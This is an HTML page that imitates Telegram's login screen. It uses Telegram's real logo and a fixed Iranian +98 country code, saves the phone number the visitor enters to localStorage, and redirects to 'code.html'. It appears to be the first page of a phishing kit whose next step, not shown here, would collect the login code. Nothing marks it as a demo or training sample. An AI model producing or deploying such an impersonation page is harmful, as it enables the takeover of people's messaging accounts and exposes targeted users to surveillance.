<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ورود به تلگرام</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #1c1c1e;
            padding: 40px 30px;
            border-radius: 16px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 0 30px rgba(0,0,0,0.9);
            text-align: center;
        }
        .logo { width: 80px; margin-bottom: 16px; }
        .title { color: #ffffff; font-size: 24px; font-weight: 600; margin-bottom: 6px; }
        .subtitle { color: #8e8e93; font-size: 14px; margin-bottom: 24px; }
        .input-group { text-align: left; margin-bottom: 16px; }
        .input-group label { display: block; color: #8e8e93; font-size: 13px; margin-bottom: 4px; }
        .input-group .phone-wrapper {
            display: flex;
            align-items: center;
            background: #2c2c2e;
            border-radius: 10px;
            padding: 4px;
        }
        .input-group .country-code {
            color: white;
            padding: 12px 10px;
            background: #3a3a3c;
            border-radius: 8px 0 0 8px;
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 4px;
            cursor: pointer;
        }
        .input-group .country-code span { font-size: 12px; color: #8e8e93; }
        .input-group input[type="text"] {
            flex: 1;
            padding: 12px;
            background: #2c2c2e;
            border: none;
            border-radius: 0 8px 8px 0;
            color: white;
            font-size: 16px;
            outline: none;
            width: 100%;
        }
        .input-group input::placeholder { color: #636366; }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #0088cc;
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .login-btn:hover { background: #0077b3; }
        .error-msg { color: #ff4444; font-size: 13px; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://telegram.org/img/t_logo.png" class="logo" alt="Telegram">
        <div class="title">Log In</div>
        <div class="subtitle">Enter your phone number to log in to Telegram</div>

        <form action="code.html" method="GET" onsubmit="savePhone(event)">
            <div class="input-group">
                <label>Your Phone Number</label>
                <div class="phone-wrapper">
                    <div class="country-code">+98 <span>▼</span></div>
                    <input type="text" name="phone" id="phone" placeholder="912 345 6789" required>
                </div>
            </div>
            <button type="submit" class="login-btn">LOG IN</button>
        </form>
    </div>

    <script>
        function savePhone(event) {
            event.preventDefault();
            const phone = document.getElementById('phone').value;
            localStorage.setItem('phone', phone);
            window.location.href = 'code.html';
        }
    </script>
</body>
</html>
